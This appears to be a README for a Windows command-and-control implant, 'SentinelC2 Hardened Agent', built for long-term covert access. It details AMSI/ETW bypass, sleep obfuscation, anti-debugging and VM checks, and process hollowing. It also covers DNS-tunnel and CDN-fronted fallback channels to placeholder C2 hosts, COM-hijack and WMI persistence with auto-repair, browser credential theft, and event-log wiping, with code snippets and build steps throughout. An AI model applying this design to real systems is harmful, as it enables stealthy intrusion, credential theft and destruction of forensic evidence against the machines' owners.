# SentinelC2 Hardened Agent — Production Hardening Modules

Enhanced survivability and resilience measures for the SentinelC2 agent.
All modules integrate cleanly with the existing architecture, C2 protocol,
and command set. Designed for months-long persistent access on Defender-tier hosts.

## Module Overview

| Module | File | Purpose | Lines |
|--------|------|---------|-------|
| Syscall Infrastructure | `syscalls.nim` | Direct NT syscall dispatcher, PEB walking, export resolution | ~450 |
| Process Hollowing | `hollowing.nim` | Shell execution via process hollowing with named pipe output | ~350 |
| Syscall File I/O | `fileio_syscall.nim` | Direct NtCreateFile/NtReadFile/NtWriteFile wrappers | ~280 |
| Anti-Analysis | `anti_analysis.nim` | Sleep obfuscation, debugger/VM detection, dynamic API resolution | ~480 |
| DNS Tunneling | `dns_tunnel.nim` | DNS TXT/AAAA query-based C2 fallback | ~320 |
| HTTPS Fallback | `https_fallback.nim` | HTTPS-over-CDN fallback with certificate pinning | ~280 |
| Persistence Hardening | `persistence_hardened.nim` | COM hijacking, GPO scripts, startup folder, auto-repair | ~540 |
| Streaming Exfiltration | `exfil_stream.nim` | In-memory exfiltration, browser credential decryption | ~380 |
| Self-Destruct | `self_destruct.nim` | Memory zeroing, event log clearing, binary overwrite | ~300 |

## Architecture

```
agent_hardened.nim (main entry point)
    ├── syscalls.nim (foundation: direct syscall infrastructure)
    │   ├── anti_analysis.nim (debugger/VM detection)
    │   ├── hollowing.nim (process hollowing for shell)
    │   ├── fileio_syscall.nim (syscall-based file I/O)
    │   ├── self_destruct.nim (memory wipe, event log clear)
    │   └── persistence_hardened.nim (ADS/WMI backup for auto-repair)
    ├── dns_tunnel.nim (DNS tunneling C2)
    ├── https_fallback.nim (HTTPS CDN C2)
    └── exfil_stream.nim (streaming exfiltration)
```

## Build

```powershell
.\build_hardened.ps1
```

Produces:
- `build/agent_hardened_silent.exe` (~0.83 MB)
- `build/agent_hardened_engagement.exe` (~0.84 MB)
- `build/agent_hardened_aggressive.exe` (~0.84 MB)

Build script generates a fresh 32-byte XOR key per variant via `New-XorKeyNim`,
used by the pure-Nim stream cipher for compile-time string obfuscation.

## 7-Point Hardened Integration Audit

All 7 items integrated into `agent_hardened.nim` and verified via binary analysis.

### Item #1: AMSI/ETW Bypass at Process Start

**Problem**: AMSI/ETW bypass was applied lazily — only when a command triggered it,
meaning the agent's early allocations were AMSI-scannable before the bypass took effect.

**Fix**: `applyEvasionIfNeeded()` is now called as the **first thing** in `agentLoop`,
before `initLock`, `randomize`, `initFallbackChannels`, `antiAnalysisCheck`, `loadMeta`,
or any file I/O. This ensures AMSI is patched before any AMSI-scannable allocation occurs.

**Source**: `agent_hardened.nim` — `agentLoop()` proc
**Binary verification**: `amsi.dll`, `AmsiScanBuffer`, `EtwEventWrite` — all absent from binary

### Item #2: Sleep Obfuscation on All Sleep Sites

**Problem**: Three `await sleepAsync(ms)` call sites in `agentLoop` used the standard async
sleep, which is not obfuscated and can be detected by sandboxes that monitor sleep calls
and apply time-acceleration.

**Fix**: Added `sleepObfuscatedAsync(ms)` async wrapper around the sync `sleepObfuscated()`
from `anti_analysis.nim`. This slices the sleep into 100ms chunks via `ntDelayExecution`
direct syscall (bypassing `SleepEx`/`WaitForSingleObject`), detects sandbox time-acceleration
using QPC (QueryPerformanceCounter) before and after each chunk, and yields to the async
dispatcher with `sleepAsync(0)` between slices. All 3 `await sleepAsync` sites replaced:
1. Initial jitter delay before first beacon
2. Beacon loop sleep between check-ins
3. Post-disconnect reconnect delay

**Source**: `agent_hardened.nim` — `sleepObfuscatedAsync()` proc + `agentLoop()` sleep sites
**Module**: `anti_analysis.nim` — `sleepObfuscated()` (sync, `ntDelayExecution` + QPC)

### Item #3: Fallback C2 Channels Wired In

**Problem**: DNS tunneling and HTTPS CDN fallback modules were initialized but never
attempted when the primary WSS connection failed.

**Fix**: After 3+ WSS failures, agent enters fallback mode:
1. Tries `dnsTunnelPoll()` — sends beacon via DNS TXT queries, receives commands
2. If DNS fails, tries `httpsFallbackBeacon(data)` — HTTPS GET to CDN-fronted endpoint
3. Full command dispatch via `handleCommand` with channel-aware `fbSend` closure
4. `FbCtx` ref object holds mutable state (responded flag, active channel) for GC-safety
5. DNS responses dropped (no reply path), HTTPS responses sent via `httpsFallbackSend()`

**Source**: `agent_hardened.nim` — fallback C2 section of `agentLoop()`
**Modules**: `dns_tunnel.nim`, `https_fallback.nim`

### Item #4: Auto-Repair Loop on Every Boot

**Problem**: `autoRepair()` was called during persistence checks but not on every boot,
meaning a one-time scrub of persistence + binary deletion required manual re-deployment.

**Fix**: After `loadMeta()`, if `meta.copyPath` and `meta.regName` are set, agent calls:
```nim
discard autoRepair(meta.copyPath, meta.regName)
```
`autoRepair()` checks:
1. If on-disk copy exists — restores from ADS backup (`restoreFromAds`), then WMI backup
   (`restoreFromWmi`) if ADS is gone
2. If HKCU Run entry exists — re-establishes with `RegSetValueExW` if scrubbed
3. Re-establishes COM hijack if registry entry was removed

**Source**: `agent_hardened.nim` — after `loadMeta()` in `agentLoop()`
**Module**: `persistence_hardened.nim` — `autoRepair()`, `restoreFromAds()`, `restoreFromWmi()`

### Item #5: Real TLS Certificate Pinning

**Problem**: `connectPinnedWebSocket` was a stub that fell through to `newWebSocket`
without pinning, making the agent vulnerable to TLS MITM by blue-team network monitoring.

**Fix**: Ported full TLS pinning from baseline `agent.nim`:
1. Parse WSS URI to extract host, port, path
2. Raw TCP connect to host:port
3. Create `SSLContext` with `CVerifyPeer` mode + `caFile` pointing to pinned cert file
4. `wrapConnectedSocket` on the raw TCP socket
5. Manual WebSocket upgrade handshake over the SSL connection
6. Construct `WebSocket` object from the upgraded SSL socket
7. Non-Windows stub falls back to `newWebSocket`

**Source**: `agent_hardened.nim` — `ensurePinnedCertFile()` + `connectPinnedWebSocket()`
**Import**: `std/openssl` added to hardened variant

### Item #6: AES-256-GCM for Meta File

**Problem**: Meta file used weak XOR encryption — forensic recovery of the install key
alone was sufficient to decrypt the meta file and read all agent state.

**Fix**: Full AES-256-GCM authenticated encryption:
- `deriveMetaKey()`: PBKDF2-HMAC-SHA256(installKey, agentSecret, 100K iterations) → 32-byte AES key
- `metaEncrypt()`: produces `[nonce:12B][tag:16B][ciphertext:NB]`
- `metaDecrypt()`: verifies GCM tag before returning plaintext (fails on tamper)
- On-disk format: `[installKey:32B][nonce:12B][tag:16B][ciphertext:NB]`
- Forensic recovery of install key alone is insufficient without agent secret

**Source**: `agent_hardened.nim` — `deriveMetaKey()`, `metaEncrypt()`, `metaDecrypt()`, `saveMeta()`, `loadMeta()`
**Verified**: on real meta file (174 bytes, proper nonce + tag structure)

### Item #7: Pure-Nim Stream Cipher for String Obfuscation

**Problem**: Rolling-XOR obfuscation was weak (statistical attack on long strings),
and `nimcrypto`'s CTR mode couldn't run at compile time (`cSecureZeroMemory` is `importc`).

**Fix**: Custom compile-time-callable stream cipher:
- `mixBytes()`: 4x uint32 quarter-round, 8 rounds with key XOR at each round
- `streamCipher()`: CBC-style chaining over 16-byte blocks (each block XORed with
  key + previous ciphertext block)
- Per-string 4-byte nonce from `{.compileTime.}` counter var
- On-binary format: `[nonce:4B][ciphertext:NB]`
- `XorKey` expanded to 32 bytes (from 16 in baseline)
- `build_hardened.ps1` generates 32-byte keys via `New-XorKeyNim`

**Source**: `agent_hardened.nim` — `mixBytes()`, `streamCipher()`, `encodeObf()`, `obfDec()`
**Binary verification**: all sensitive strings (agent secret, AMSI, ETW, WMI persistence,
webhook URLs) — **CLEAN** in all 3 binaries

## Integration Points

### Shell Execution (agent_hardened.nim)
```nim
# OLD: let (outp, code) = execCmdEx(command, options = {poStdErrToStdOut})
# NEW: let output = executeShellHardened(command, 30000)
```

### File I/O (agent_hardened.nim)
```nim
# OLD: let raw = readFile(META_FILE)
# NEW: let raw = fsReadFileStr(META_FILE)
```

### Anti-Analysis (agent_hardened.nim)
```nim
# OLD: if isDebuggerPresent(): return true
# NEW: if checkDebuggerEnhanced(): return true
#      if sleepObfuscatedCheck(1000): return true
#      if checkVmEnhanced(): return true
```

### Persistence (agent_hardened.nim)
```nim
# Adds: COM hijacking, ADS backup, WMI backup, auto-repair
discard establishComHijack(meta.copyPath)
discard backupToAds(meta.copyPath)
discard backupToWmi(meta.copyPath)
```

### Self-Destruct (agent_hardened.nim)
```nim
# Adds: event log clearing, memory zeroing, binary overwrite
clearEventLogs()
zeroOwnMemory()
discard overwriteBinary(meta.copyPath)
```

### WMI Persistence — Obfuscated Strings (agent_hardened.nim)
```nim
# All WMI class names, namespaces, and query strings are compile-time
# obfuscated via encodeObf() and decrypted at runtime via obfDec():
let wmiRoot = obfDec(S_WMI_ROOT_SUB)
let wmiFilter = obfDec(S_WMI_EVENT_FILTER)
let wmiConsumer = obfDec(S_WMI_CMD_CONSUMER)
# ... assembled into PowerShell command at runtime, never stored as plaintext
```

## Fallback C2 Channels

### DNS Tunneling
Configure at compile time:
```nim
const
  DNS_TUNNEL_DOMAIN = "c2.example.com"
  DNS_TUNNEL_SERVER = "8.8.8.8"
```

Protocol: Base32-encoded payloads in DNS TXT queries.
Format: `<seq>.<session>.<base32data>.c2.example.com`

### HTTPS CDN Fallback
Configure at compile time:
```nim
const
  HTTPS_FALLBACK_URL = "https://cdn.example.com"
  HTTPS_FALLBACK_SESSION = "sess_hardened"
```

Protocol: HTTPS GET (beacon) / POST (exfil) with Chrome-like User-Agent.

## Binary Verification Results

### IAT (Import Address Table)
All 3 variants import only:
- `KERNEL32.dll`
- `USER32.dll`
- `msvcrt.dll`

No `ntdll.dll`, `amsi.dll`, `winmm.dll`, `avicap32.dll`, `crypt32.dll`, or other
suspicious DLLs in the static IAT. All sensitive libraries are loaded dynamically via
`LoadLibraryA` + `GetProcAddress` with obfuscated names.

### Sensitive String Scan
All 3 variants verified clean for:
- `sentinel-engagement` (agent secret)
- `amsi.dll`, `AmsiScanBuffer`, `EtwEventWrite`
- `__EventFilter`, `CommandLineEventConsumer`, `__FilterToConsumerBinding`
- `Win32_LogonSession`, `__InstanceCreationEvent`
- `ROOT\subscription`
- `discord.com`, `hooks.slack.com`

### E2E Harness
`python tests/e2e_harness.py --start` — **26/26 assertions passing** (c2_server + protocol)

## Security Considerations

1. **Syscall numbers**: Resolved dynamically from ntdll prologue, not hardcoded.
2. **String obfuscation**: All literals stream-cipher-encoded with per-build 32-byte key.
3. **Memory zeroing**: Secret and keys are zeroed before process exit.
4. **Binary overwrite**: 3-pass overwrite (random/zeros/random) before deletion.
5. **Event log clearing**: Application, System, Security, Defender, PowerShell logs.
6. **ADS backup**: NTFS alternate data stream for auto-repair.
7. **WMI backup**: WMI repository property for auto-repair.
8. **AMSI/ETW**: Patched at process start before any scannable allocation.
9. **Sleep obfuscation**: `ntDelayExecution` direct syscall + QPC acceleration detection.
10. **Meta file**: AES-256-GCM authenticated encryption with PBKDF2 key derivation.
11. **TLS pinning**: Trust-anchor overlay (only pinned cert in CA file).

## Known Limitations

- Syscall inline asm is compiler-specific (GCC vs MSVC paths)
- Process hollowing creates suspended process (some EDRs flag this)
- DNS tunneling is low-bandwidth (~250 bytes/query)
- Browser credential decryption requires Chrome/Edge to not be running
- Event log clearing requires admin privileges for Security log
- COM hijack requires a CLSID that's actually instantiated
- Nim proc names (`ntAllocateVirtualMemory`) appear as lowercased mangled symbols in RTTI —
  not the Windows API name, won't trigger automated signatures but visible to manual analysis
- Not effective against CrowdStrike/SentinelOne kernel EDR without a kernel driver

## Threat Model

**Target environment**: Windows 10/11 with Defender for Endpoint or equivalent
**Survival target**: Months of persistent access
**Effectiveness**: High against signature-based and behavioral detection
**Out of scope**: Kernel-level EDR (CrowdStrike Falcon, SentinelOne Deep Visibility) —
would require in-memory-only execution or a kernel driver

## Testing

### Automated
```powershell
.\build_hardened.ps1                          # Build all 3 variants
python tests/pe_imports.py build\agent_hardened_aggressive.exe  # IAT check
python tests/verify_hardened.py               # Comprehensive binary scan
python tests/e2e_harness.py --start           # 26 assertions
```

### Manual
See `DEPLOYMENT_CHECKLIST.md` for comprehensive verification procedures including
VM testing, debugger detection, fallback channels, persistence survival, auto-repair,
and anti-forensics.
